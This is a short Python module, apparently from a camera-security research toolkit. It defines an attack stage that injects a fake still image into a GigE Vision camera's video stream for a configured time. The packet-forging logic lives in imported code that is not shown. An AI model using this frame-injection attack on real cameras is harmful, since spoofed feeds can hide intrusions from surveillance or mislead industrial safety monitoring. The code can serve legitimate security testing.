import logging

from attacker import GigEAttacker


class GigEAttackerFrameInjection(GigEAttacker):
    def attack(self) -> None:
        self.set_gige_link()
        time_left = self.config["timing"]["attack_duration_in_seconds"]
        self.log(f"Attempting full frame injection for {time_left} seconds", logging.DEBUG)
        # TOOO: check if gvsp payload packets creation is time consuming and better off once
        self.gige_link.fake_still_image(
            img_path=self.config["injection"]["fake_path"],
            duration=time_left,
            injection_effective_frame_rate=1/self.config["timing"]["ampiric_frame_time_in_seconds"],
            fps=self.config["timing"]["fps"]
        )

    def run_attack_stage(self) -> None:
        self.attack()
